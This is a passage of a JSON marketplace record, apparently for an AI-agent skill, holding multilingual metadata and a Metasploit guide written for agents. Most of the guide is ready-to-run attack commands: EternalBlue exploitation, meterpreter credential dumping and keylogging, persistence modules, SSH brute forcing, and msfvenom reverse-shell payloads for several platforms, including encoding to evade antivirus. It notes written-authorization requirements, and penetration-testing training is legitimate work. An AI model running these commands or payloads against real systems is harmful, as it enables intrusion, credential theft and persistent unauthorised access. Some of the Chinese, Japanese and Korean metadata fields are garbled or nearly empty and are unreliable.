e manutenção de acesso a sistemas comprometidos","ru":"Фреймворк Metasploit представляет собой унифицированную платформу для эксплуатации уязвимостей и поддержания доступа к скомпрометированным системам","ar":"إطار Metasploit هو منصة موحدة لاستغلال الثغرات و الحفاظ على الوصول إلى الأنظمة المخترقة","en":""},"seo":{"title":{"zh":"Metasploit ","ja":"Metasploit","ko":"Metasploit ","es":"Metasploit Framework: Penetración y Pruebas de Seguridad","fr":"Metasploit Framework: Test de Pénétration et de Sécurité","de":"Metasploit Framework: Penetrationstests und Sicherheitspr...","pt":"Metasploit Framework: Teste de Penetração Avançado","ru":"Фреймворк Metasploit: Продвинутый тест на проникновение","ar":"إطار Metasploit: اختبار الاختراق المتقدم","en":"Metasploit Framework"},"description":{"zh":"Metasploit ","ja":"Metasploit","ko":"Metasploit ","es":"El Metasploit Framework es una plataforma integral para pruebas de penetración y seguridad. Ofrece herramientas para explotar vulnerabilidades, generar paylo...","fr":"Le Metasploit Framework est une plateforme complète pour les tests de pénétration et de sécurité. Il propose des outils pour exploiter les vulnérabilités, gé...","de":"Das Metasploit Framework ist eine umfassende Plattform für Penetrationstests und Sicherheitsprüfungen. Es bietet Tools zur Ausnutzung von Schwachstellen, zur...","pt":"O Metasploit Framework é uma plataforma unificada para exploração de vulnerabilidades e manutenção de acesso a sistemas comprometidos","ru":"Фреймворк Metasploit представляет собой унифицированную платформу для эксплуатации уязвимостей и поддержания доступа к скомпрометированным системам","ar":"إطار Metasploit هو منصة موحدة لاستغلال الثغرات و الحفاظ على الوصول إلى الأنظمة المخترقة","en":""},"definition":{"en":""},"features":{"zh":["Metasploit ","Metasploit ","Metasploit ","Metasploit ","Metasploit "],"ja":["Metasploit","Metasploit","Metasploit","Metasploit","Metasploit"],"ko":["Metasploit ","Metasploit ","Metasploit ","Metasploit ","Metasploit "],"es":["Explotación de vulnerabilidades","Generación de payloads","Escaneo auxiliar","Mantenimiento del acceso a sistemas comprometidos","Pruebas de penetración y seguridad","Análisis de vulnerabilidades"],"fr":["Exploitation des vulnérabilités","Génération de payloads","Analyse auxiliaire","Maintenance de l''accès aux systèmes compromis","Tests de pénétration et de sécurité","Analyse des vulnérabilités"],"de":["Ausnutzung von Schwachstellen","Generierung von Payloads","Auxiliarscanning","Aufrechterhalten des Zugriffs auf kompromittierte Systeme","Penetrationstests und Sicherheitsprüfungen","Schwachstellenanalyse"],"pt":["Teste de penetração abrangente","Exploração de vulnerabilidades","Geração de payloads","Scanning auxiliar","Manutenção de acesso a sistemas comprometidos"],"ru":["Комплексное тестирование на проникновение","Эксплуатация уязвимостей","Генерация полезной нагрузки","Вспомогательное сканирование","Поддержание доступа к скомпрометированным системам"],"ar":["اختبار الاختراق الشامل","استغلال الثغرات","توليد حمولة","فحص مساعد","الحفاظ على الوصول إلى الأنظمة المخترقة"]},"keywords":{"zh":["Metasploit ","Metasploit ","Metasploit API","Metasploit ","Metasploit ","Metasploit "],"ja":["Metasploit","Metasploit","Metasploit API","Metasploit","Metasploit","Metasploit"],"ko":["Metasploit ","Metasploit ","Metasploit API","Metasploit ","Metasploit ","Metasploit "],"es":["Metasploit Framework","pruebas de penetración","seguridad informática","explotación de vulnerabilidades","generación de payloads","escaneo auxiliar","mantenimiento del acceso","análisis de vulnerabilidades"],"fr":["Metasploit Framework","tests de pénétration","sécurité informatique","exploitation des vulnérabilités","génération de payloads","analyse auxiliaire","maintenance de l''accès","analyse des vulnérabilités"],"de":["Metasploit Framework","Penetrationstests","Computersicherheit","Ausnutzung von Schwachstellen","Generierung von Payloads","Auxiliarscanning","Aufrechterhalten des Zugriffs","Schwachstellenanalyse"],"pt":["Metasploit Framework","teste de penetração","exploração de vulnerabilidades","segurança cibernética","hacking ético","ferramentas de segurança","testes de segurança","vulnerabilidades de software"],"ru":["Фреймворк Metasploit","тестирование на проникновение","эксплуатация уязвимостей","кибербезопасность","этический хакинг","инструменты безопасности","тесты безопасности","уязвимости программного обеспечения"],"ar":["إطار Metasploit","اختبار الاختراق","استغلال الثغرات","أمان السيبراني","هكر أخلاقي","أدوات الأمان","اختبارات الأمان","ثغرات البرمجيات"]}},"owner":"claudiodearaujo","repo":"Sistema-de-narra-o-de-livro-front","repoPath":"claudiodearaujo/Sistema-de-narra-o-de-livro-front","stars":0,"forks":0,"updatedAt":"2026-02-18T01:08:43.502Z","topics":[],"category":"community","skillMd":{"name":"Metasploit Framework","description":"This skill should be used when the user asks to use Metasploit for penetration testing, exploit vulnerabilities with msfconsole, create payloads with msfvenom, perform post-exploitation, use auxiliary modules for scanning, or develop custom exploits. It provides comprehensive guidance for leveraging the Metasploit Framework in security assessments.","version":"1.1","bodyPreview":"# Metasploit Framework\n\n## Purpose\n\nLeverage the Metasploit Framework for comprehensive penetration testing, from initial exploitation through post-exploitation activities. Metasploit provides a unified platform for vulnerability exploitation, payload generation, auxiliary scanning, and maintaining access to compromised systems during authorized security assessments.\n\n## Prerequisites\n\n### Required Tools\n```bash\n# Metasploit comes pre-installed on Kali Linux\n# For other systems:\ncurl https://raw","body":"# Metasploit Framework\n\n## Purpose\n\nLeverage the Metasploit Framework for comprehensive penetration testing, from initial exploitation through post-exploitation activities. Metasploit provides a unified platform for vulnerability exploitation, payload generation, auxiliary scanning, and maintaining access to compromised systems during authorized security assessments.\n\n## Prerequisites\n\n### Required Tools\n```bash\n# Metasploit comes pre-installed on Kali Linux\n# For other systems:\ncurl https://raw.githubusercontent.com/rapid7/metasploit-omnibus/master/config/templates/metasploit-framework-wrappers/msfupdate.erb > msfinstall\nchmod 755 msfinstall\n./msfinstall\n\n# Start PostgreSQL for database support\nsudo systemctl start postgresql\nsudo msfdb init\n```\n\n### Required Knowledge\n- Network and system fundamentals\n- Understanding of vulnerabilities and exploits\n- Basic programming concepts\n- Target enumeration techniques\n\n### Required Access\n- Written authorization for testing\n- Network access to target systems\n- Understanding of scope and rules of engagement\n\n## Outputs and Deliverables\n\n1. **Exploitation Evidence** - Screenshots and logs of successful compromises\n2. **Session Logs** - Command history and extracted data\n3. **Vulnerability Mapping** - Exploited vulnerabilities with CVE references\n4. **Post-Exploitation Artifacts** - Credentials, files, and system information\n\n## Core Workflow\n\n### Phase 1: MSFConsole Basics\n\nLaunch and navigate the Metasploit console:\n\n```bash\n# Start msfconsole\nmsfconsole\n\n# Quiet mode (skip banner)\nmsfconsole -q\n\n# Basic navigation commands\nmsf6 > help                    # Show all commands\nmsf6 > search [term]           # Search modules\nmsf6 > use [module]            # Select module\nmsf6 > info                    # Show module details\nmsf6 > show options            # Display required options\nmsf6 > set [OPTION] [value]    # Configure option\nmsf6 > run / exploit           # Execute module\nmsf6 > back                    # Return to main console\nmsf6 > exit                    # Exit msfconsole\n```\n\n### Phase 2: Module Types\n\nUnderstand the different module categories:\n\n```bash\n# 1. Exploit Modules - Target specific vulnerabilities\nmsf6 > show exploits\nmsf6 > use exploit/windows/smb/ms17_010_eternalblue\n\n# 2. Payload Modules - Code executed after exploitation\nmsf6 > show payloads\nmsf6 > set PAYLOAD windows/x64/meterpreter/reverse_tcp\n\n# 3. Auxiliary Modules - Scanning, fuzzing, enumeration\nmsf6 > show auxiliary\nmsf6 > use auxiliary/scanner/smb/smb_version\n\n# 4. Post-Exploitation Modules - Actions after compromise\nmsf6 > show post\nmsf6 > use post/windows/gather/hashdump\n\n# 5. Encoders - Obfuscate payloads\nmsf6 > show encoders\nmsf6 > set ENCODER x86/shikata_ga_nai\n\n# 6. Nops - No-operation padding for buffer overflows\nmsf6 > show nops\n\n# 7. Evasion - Bypass security controls\nmsf6 > show evasion\n```\n\n### Phase 3: Searching for Modules\n\nFind appropriate modules for targets:\n\n```bash\n# Search by name\nmsf6 > search eternalblue\n\n# Search by CVE\nmsf6 > search cve:2017-0144\n\n# Search by platform\nmsf6 > search platform:windows type:exploit\n\n# Search by type and keyword\nmsf6 > search type:auxiliary smb\n\n# Filter by rank (excellent, great, good, normal, average, low, manual)\nmsf6 > search rank:excellent\n\n# Combined search\nmsf6 > search type:exploit platform:linux apache\n\n# View search results columns:\n# Name, Disclosure Date, Rank, Check (if it can verify vulnerability), Description\n```\n\n### Phase 4: Configuring Exploits\n\nSet up an exploit for execution:\n\n```bash\n# Select exploit module\nmsf6 > use exploit/windows/smb/ms17_010_eternalblue\n\n# View required options\nmsf6 exploit(windows/smb/ms17_010_eternalblue) > show options\n\n# Set target host\nmsf6 exploit(...) > set RHOSTS 192.168.1.100\n\n# Set target port (if different from default)\nmsf6 exploit(...) > set RPORT 445\n\n# View compatible payloads\nmsf6 exploit(...) > show payloads\n\n# Set payload\nmsf6 exploit(...) > set PAYLOAD windows/x64/meterpreter/reverse_tcp\n\n# Set local host for reverse connection\nmsf6 exploit(...) > set LHOST 192.168.1.50\nmsf6 exploit(...) > set LPORT 4444\n\n# View all options again to verify\nmsf6 exploit(...) > show options\n\n# Check if target is vulnerable (if supported)\nmsf6 exploit(...) > check\n\n# Execute exploit\nmsf6 exploit(...) > exploit\n# or\nmsf6 exploit(...) > run\n```\n\n### Phase 5: Payload Types\n\nSelect appropriate payload for the situation:\n\n```bash\n# Singles - Self-contained, no staging\nwindows/shell_reverse_tcp\nlinux/x86/shell_bind_tcp\n\n# Stagers - Small payload that downloads larger stage\nwindows/meterpreter/reverse_tcp\nlinux/x86/meterpreter/bind_tcp\n\n# Stages - Downloaded by stager, provides full functionality\n# Meterpreter, VNC, shell\n\n# Payload naming convention:\n# [platform]/[architecture]/[payload_type]/[connection_type]\n# Examples:\nwindows/x64/meterpreter/reverse_tcp\nlinux/x86/shell/bind_tcp\nphp/meterpreter/reverse_tcp\njava/meterpreter/reverse_https\nandroid/meterpreter/reverse_tcp\n```\n\n### Phase 6: Meterpreter Session\n\nWork with Meterpreter post-exploitation:\n\n```bash\n# After successful exploitation, you get Meterpreter prompt\nmeterpreter >\n\n# System Information\nmeterpreter > sysinfo\nmeterpreter > getuid\nmeterpreter > getpid\n\n# File System Operations\nmeterpreter > pwd\nmeterpreter > ls\nmeterpreter > cd C:\\\\Users\nmeterpreter > download file.txt /tmp/\nmeterpreter > upload /tmp/tool.exe C:\\\\\n\n# Process Management\nmeterpreter > ps\nmeterpreter > migrate [PID]\nmeterpreter > kill [PID]\n\n# Networking\nmeterpreter > ipconfig\nmeterpreter > netstat\nmeterpreter > route\nmeterpreter > portfwd add -l 8080 -p 80 -r 10.0.0.1\n\n# Privilege Escalation\nmeterpreter > getsystem\nmeterpreter > getprivs\n\n# Credential Harvesting\nmeterpreter > hashdump\nmeterpreter > run post/windows/gather/credentials/credential_collector\n\n# Screenshots and Keylogging\nmeterpreter > screenshot\nmeterpreter > keyscan_start\nmeterpreter > keyscan_dump\nmeterpreter > keyscan_stop\n\n# Shell Access\nmeterpreter > shell\nC:\\Windows\\system32> whoami\nC:\\Windows\\system32> exit\nmeterpreter >\n\n# Background Session\nmeterpreter > background\nmsf6 exploit(...) > sessions -l\nmsf6 exploit(...) > sessions -i 1\n```\n\n### Phase 7: Auxiliary Modules\n\nUse auxiliary modules for reconnaissance:\n\n```bash\n# SMB Version Scanner\nmsf6 > use auxiliary/scanner/smb/smb_version\nmsf6 auxiliary(scanner/smb/smb_version) > set RHOSTS 192.168.1.0/24\nmsf6 auxiliary(...) > run\n\n# Port Scanner\nmsf6 > use auxiliary/scanner/portscan/tcp\nmsf6 auxiliary(...) > set RHOSTS 192.168.1.100\nmsf6 auxiliary(...) > set PORTS 1-1000\nmsf6 auxiliary(...) > run\n\n# SSH Version Scanner\nmsf6 > use auxiliary/scanner/ssh/ssh_version\nmsf6 auxiliary(...) > set RHOSTS 192.168.1.0/24\nmsf6 auxiliary(...) > run\n\n# FTP Anonymous Login\nmsf6 > use auxiliary/scanner/ftp/anonymous\nmsf6 auxiliary(...) > set RHOSTS 192.168.1.100\nmsf6 auxiliary(...) > run\n\n# HTTP Directory Scanner\nmsf6 > use auxiliary/scanner/http/dir_scanner\nmsf6 auxiliary(...) > set RHOSTS 192.168.1.100\nmsf6 auxiliary(...) > run\n\n# Brute Force Modules\nmsf6 > use auxiliary/scanner/ssh/ssh_login\nmsf6 auxiliary(...) > set RHOSTS 192.168.1.100\nmsf6 auxiliary(...) > set USER_FILE /usr/share/wordlists/users.txt\nmsf6 auxiliary(...) > set PASS_FILE /usr/share/wordlists/rockyou.txt\nmsf6 auxiliary(...) > run\n```\n\n### Phase 8: Post-Exploitation Modules\n\nRun post modules on active sessions:\n\n```bash\n# List sessions\nmsf6 > sessions -l\n\n# Run post module on specific session\nmsf6 > use post/windows/gather/hashdump\nmsf6 post(windows/gather/hashdump) > set SESSION 1\nmsf6 post(...) > run\n\n# Or run directly from Meterpreter\nmeterpreter > run post/windows/gather/hashdump\n\n# Common Post Modules\n# Credential Gathering\npost/windows/gather/credentials/credential_collector\npost/windows/gather/lsa_secrets\npost/windows/gather/cachedump\npost/multi/gather/ssh_creds\n\n# System Enumeration\npost/windows/gather/enum_applications\npost/windows/gather/enum_logged_on_users\npost/windows/gather/enum_shares\npost/linux/gather/enum_configs\n\n# Privilege Escalation\npost/windows/escalate/getsystem\npost/multi/recon/local_exploit_suggester\n\n# Persistence\npost/windows/manage/persistence_exe\npost/linux/manage/sshkey_persistence\n\n# Pivoting\npost/multi/manage/autoroute\n```\n\n### Phase 9: Payload Generation with msfvenom\n\nCreate standalone payloads:\n\n```bash\n# Basic Windows reverse shell\nmsfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.1.50 LPORT=4444 -f exe -o shell.exe\n\n# Linux reverse shell\nmsfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=192.168.1.50 LPORT=4444 -f elf -o shell.elf\n\n# PHP reverse shell\nmsfvenom -p php/meterpreter/reverse_tcp LHOST=192.168.1.50 LPORT=4444 -f raw -o shell.php\n\n# Python reverse shell\nmsfvenom -p python/meterpreter/reverse_tcp LHOST=192.168.1.50 LPORT=4444 -f raw -o shell.py\n\n# PowerShell payload\nmsfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.1.50 LPORT=4444 -f psh -o shell.ps1\n\n# ASP web shell\nmsfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.50 LPORT=4444 -f asp -o shell.asp\n\n# WAR file (Tomcat)\nmsfvenom -p java/meterpreter/reverse_tcp LHOST=192.168.1.50 LPORT=4444 -f war -o shell.war\n\n# Android APK\nmsfvenom -p android/meterpreter/reverse_tcp LHOST=192.168.1.50 LPORT=4444 -o shell.apk\n\n# Encoded payload (evade AV)\nmsfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.50 LPORT=4444 -e x86/shikata_ga_nai -i 5 -f exe -o encoded.exe\n\n# List available formats\nmsfvenom --list formats\n\n# List available encoders\nmsfvenom --list encoders\n```\n\n### Phase 10: Setting Up Handlers\n\nConfigure listener for incoming connections:\n\n```bash\n# Manual handler setup\nmsf6 > use exploit/multi/handler\nmsf6 exploit(multi/handler) > set PAYLOAD windows/x64/meterpreter/reverse_tcp\nmsf6 exploit(multi/handler) > set LHOST 192.168.1.50\nmsf6 exploit(multi/handler) > set LPORT 4444\nmsf6 exploit(multi/handler) > exploit -j\n\n# The -j flag runs as background job\nmsf6 > jobs -l\n\n# When payload executes on target, session opens\n[*] Meterpreter session 1 opened\n\n# Interact with session\nmsf6 > sessions -i 1\n```\n\n## Quick Reference\n\n### Essential MSFConsole Commands\n\n| Command | Description |\n|---------|-------------|\n| `search [term]` | Search for modules |\n| `use [module]` | Select a module |\n| `info` | Display module information |\n| `show options` | Show configurable options |\n| `set [OPT] [val]` | Set option value |\n| `setg [OPT] [val]` | Set global option |\n| `run` / `exploit` | Execute module |\n| `check` | Verify target vulnerability |\n| `back` | Deselect module |\n| `sessions -l` | List active sessions |\n| `sessions -i [N]` | Interact with session |\n| `jobs -l` | List background jobs |\n| `db_nmap` | Run nmap with database |\n\n### Meterpreter Essential Commands\n\n| Command | Description |\n|---------|-------------|\n| `sysinfo` | System information |\n| `getuid` | Current user |\n| `getsystem` | Attempt privilege escalation |\n| `hashdump` | Dump password hashes |\n| `shell` | Drop to system shell |\n| `upload/download` | File transfer |\n| `screenshot` | Capture screen |\n| `keyscan_start` | Start keylogger |\n| `migrate [PID]` | Move to another process |\n| `background` | Background session |\n| `portfwd` | Port forwarding |\n\n### Common Exploit Modules\n\n```bash\n# Windows\nexploit/windows/smb/ms17_010_eternalblue\nexploit/windows/smb/ms08_067_netapi\nexploit/windows/http/iis_webdav_upload_asp\nexploit/windows/local/bypassuac\n\n# Linux\nexploit/linux/ssh/sshexec\nexploit/linux/local/overlayfs_priv_esc\nexploit/multi/http/apache_mod_cgi_bash_env_exec\n\n# Web Applications\nexploit/multi/http/tomcat_mgr_upload\nexploit/unix/webapp/wp_admin_shell_upload\nexploit/multi/http/jenkins_script_console\n```\n\n## Constraints and Limitations\n\n### Legal Requirements\n- Only use on systems you own or have written authorization to test\n- Document all testing activities\n- Follow rules of engagement\n- Report all findings to appropriate parties\n\n### Technical Limitations\n- Modern AV/EDR may detect Metasploit payloads\n- Some exploits require specific target configurations\n- Firewall rules may block reverse connections\n- Not all exploits work on all target versions\n\n### Operational Security\n- Use encrypted channels (reverse_https) when possible\n- Clean up artifacts after testing\n- Avoid detection by monitoring systems\n- Limit post-exploitation to agreed scope\n\n## Troubleshooting\n\n| Issue | Solutions |\n|-------|-----------|\n| Database not connected | Run `sudo msfdb init`, start PostgreSQL, then `db_connect` |\n| Exploit fails/no session | Run `check`; verify payload architecture; check firewall; try different payloads |\n| Session dies immediately | Migrate to stable process; use stageless payload; check AV; use AutoRunScript |\n| Payload detected by AV | Use encoding `-e x86/shikata_ga_nai -i 10`; use evasion modules; custom templates |\n"},"lastSynced":"2026-02-18T11:40:30.728Z","agentAnalysis":{"suitability":{"en":"Perfect for Cybersecurity Agents needing advanced penetration testing and vulnerability exploitation capabilities with the Metasploit Framework.","zh":"非常适合需要使用Metasploit框架进行高级渗透测试和漏洞利用的网络安全代理。","ja":"Metasploitフレームワークを使用した高度なペネトレーションテストと脆弱性の悪用が必要なサイバーセキュリティエージェントに最適です。","ko":"메타스플로이트 프레임워크를 사용하여 고급 침투 테스트 및 취약점 악용 기능이 필요한 사이버 보안 에이전트에 적합합니다.","es":"Perfecto para Agentes de Ciberseguridad que necesitan pruebas de penetración avanzadas y capacidades de explotación de vulnerabilidades con el Marco de Metasploit.","fr":"Parfait pour les Agents de Cybersécurité ayant besoin de tests de pénétration avancés et de capacités d''exploitation de vulnérabilités avec le Framework Metasploit.","de":"Perfekt für Cyber-Sicherheitsagenten, die erweiterte Penetrationstests und Vulnerability-Exploitation-Funktionen mit dem Metasploit-Framework benötigen.","pt":"Perfeito para Agentes de Cibersegurança que precisam de testes de penetração avançados e capacidades de exploração de vulnerabilidades com o Metasploit Framework.","ru":"Идеально подходит для агентов кибербезопасности, которым требуются передовые возможности тестирования на проникновение и эксплуатации уязвимостей с помощью фреймворка Metasploit.","ar":"مثالي لعمليات وكالات الأمن السيبراني التي تحتاج إلى اختبارات اختراق متقدمة وقدرات استغلال الثغرات الأمنية مع إطار Metasploit."},"recommendation":{"en":"Empowers agents to leverage the Metasploit Framework for comprehensive penetration testing, including vulnerability exploitation, payload generation, auxiliary scanning, and maintaining access to compromised systems during authorized security assessments, utilizing protocols and tools like curl and Kali Linux.","zh":"赋予代理使用Metasploit框架进行全面渗透测试的能力，包括漏洞利用、有效载荷生成、辅助扫描以及在授权安全评估期间维持对已损害系统的访问，利用curl和Kali Linux等协议和工具。","ja":"エージェントがMetasploitフレームワークを使用して、脆弱性の悪用、ペイロードの生成、補助的なスキャニング、および承認されたセキュリティ評価期间に損害を受けたシステムへのアクセスを維持するための包括的なペネトレーションテストを実行する能力を提供します。curlやKali Linuxなどのプロトコルやツールを使用します。","ko":"에이전트가 메타스플로이트 프레임워크를 사용하여 취약점 악용, 페이로드 생성, 보조 스캔 및 승인된 보안 평가期间에 손상된 시스템에 대한 액세스를 유지하는 것과 같은 포괄적인 침투 테스트를 수행할 수 있는 능력을 제공합니다. curl 및 칼리 리눅스와 같은 프로토콜 및 도구를 사용합니다.","es":"Habilita a los agentes a utilizar el Marco de Metasploit para pruebas de penetración completas, incluyendo explotación de vulnerabilidades, generación de payloads, exploración auxiliar y mantenimiento del acceso a sistemas comprometidos durante evaluaciones de seguridad autorizadas, utilizando protocolos y herramientas como curl y Kali Linux.","fr":"Permet aux agents d''utiliser le Framework Metasploit pour des tests de pénétration complets, y compris l''exploitation de vulnérabilités, la génération de payloads, le balayage auxiliaire et le maintien de l''accès à des systèmes compromis pendant les évaluations de sécurité autorisées, en utilisant des protocoles et des outils comme curl et Kali Linux.","de":"Ermächtigt Agenten, das Metasploit-Framework für umfassende Penetrationstests zu nutzen, einschließlich Ausnutzung von Schwachstellen, Payload-Generierung, auxiliarem Scannen und Aufrechterhaltung des Zugriffs auf kompromittierte Systeme während autorisierter Sicherheitsbewertungen, unter Verwendung von Protokollen und Tools wie curl und Kali Linux.","pt":"Habilita os agentes a aproveitar o Metasploit Framework para testes de penetração abrangentes, incluindo exploração de vulnerabilidades, geração de payloads, varredura auxiliar e manutenção do acesso a sistemas comprometidos durante avaliações de segurança autorizadas, utilizando protocolos e ferramentas como curl e Kali Linux.","ru":"Наделяет агентов возможностью использовать фреймворк Metasploit для всестороннего тестирования на проникновение, включая эксплуатацию уязвимостей, генерацию полезной нагрузки, вспомогательное сканирование и поддержание доступа к скомпрометированным системам во время авторизованных оценок безопасности, используя протоколы и инструменты, такие как curl и Kali Linux.","ar":"تمكين الوكالات من استخدام إطار Metasploit لإجراء اختبارات اختراق شاملة، بما في ذلك استغلال الثغرات الأمنية، وتوليد الحمولة، والفحص المساعد، والحفاظ على الوصول إلى الأنظمة المخترقة خلال التقييمات الأمنية المصرح بها، باستخدام بروتوكولات وأدوات مثل curl و Kali Linux."},"useCases":{"en":["Exploiting vulnerabilities in authorized security assessments","Generating payloads for post-exploitation activities","Conducting auxiliary scanning for network reconnaissance"],"zh":["在授权安全评估期间利用漏洞","为后期利用活动生成有效载荷","进行辅助扫描以进行网络侦察"],"ja":["承認されたセキュリティ評価期间に脆弱性を悪用する","事後悪用活動のためのペイロードを生成する","ネットワークの偵察のための補助的なスキャニングを実行する"],"ko":["승인된 보안 평가期间에 취약점을 악용하는 것","사후 악용 활동을 위한 페이로드 생성","네트워크 정찰을 위한 보조 스캔 수행"],"es":["Explotar vulnerabilidades en evaluaciones de seguridad autorizadas","Generar payloads para actividades de post-explotación","Realizar exploración auxiliar para reconocimiento de redes"],"fr":["Exploiter les vulnérabilités lors d''évaluations de sécurité autorisées","Générer des payloads pour les activités de post-exploitation","Effectuer un balayage auxiliaire pour la reconnaissance du réseau"],"de":["Schwachstellen in autorisierten Sicherheitsbewertungen ausnutzen","Payloads für Post-Exploitation-Aktivitäten generieren","Auxiliäres Scannen für Netzwerk-Reconnaissance durchführen"],"pt":["Explorar vulnerabilidades em avaliações de segurança autorizadas","Gerar payloads para atividades pós-exploração","Realizar varredura auxiliar para reconhecimento de rede"],"ru":["Эксплуатация уязвимостей в авторизованных оценках безопасности","Генерация полезной нагрузки для действий после эксплуатации","Проведение вспомогательного сканирования для сетевого разведки"],"ar":["استغلال الثغرات الأمنية في التقييمات الأمنية المصرح بها","توليد الحمولة لأنشطة ما بعد الاختراق","إجراء الفحص المساعد لاستكشاف الشبكة"]},"limitations":{"en":["Requires Kali Linux or manual installation on other systems","Needs curl for installation on non-Kali systems"],"zh":["需要卡利林克斯或在其他系统上手动安装","需要curl来安装非卡利系统"],"ja":["Kali Linuxが必要、または他のシステムに手動でインストールする必要がある","非Kaliシステムにインストールするにはcurlが必要"],"ko":["칼리 리눅스가 필요하거나 다른 시스템에 수동으로 설치해야 함","비 칼리 시스템에 설치하려면 curl 필요"],"es":["Requiere Kali Linux o instalación manual en otros sistemas","Necesita curl para la instalación en sistemas no Kali"],"fr":["Nécessite Kali Linux ou installation manuelle sur d''autres systèmes","A besoin de curl pour l''installation sur des systèmes non Kali"],"de":["Benötigt Kali Linux oder manuelle Installation auf anderen Systemen","Benötigt curl für die Installation auf nicht-Kali-Systemen"],"pt":["Exige Kali Linux ou instalação manual em outros sistemas","Necessita de curl para instalação em sistemas não Kali"],"ru":["Требует Kali Linux или ручную установку на других системах","Требует curl для установки на не-Kali системах"],"ar":["يتطلب Kali Linux أو تثبيت يدوي على أنظمة أخرى","يحتاج إلى curl للتثبيت على أنظمة غير Kali"]},"version":3},"qualityScore":70}');
